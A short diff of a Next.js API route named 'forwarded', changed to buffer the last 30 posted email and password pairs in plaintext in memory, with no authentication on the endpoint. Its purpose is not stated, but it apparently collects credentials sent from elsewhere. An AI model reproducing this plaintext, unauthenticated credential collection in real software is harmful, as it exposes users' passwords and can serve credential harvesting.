@@ -1,11 +1,22 @@
 // app/api/forwarded/route.ts
 import {NextRequest, NextResponse} from 'next/server';
 
-let latestStack: {email: string, password: string}[] = [];
+const latestStack: {email: string; password: string}[] = [];
 
 export async function POST(req: NextRequest) {
   const body = await req.json();
-  latestStack = body.stack ?? [];
+  const newEntry = body;
+
+  if (newEntry?.email && newEntry?.password) {
+    // 맨 뒤에 push → 최신 정보가 마지막에 위치
+    latestStack.push({email: newEntry.email, password: newEntry.password});
+
+    // 30개까지만 유지
+    if (latestStack.length > 30) {
+      latestStack.shift();  // 가장 오래된 값 제거 (FIFO)
+    }
+  }
+
   return NextResponse.json({status: 'ok'});
 }
 
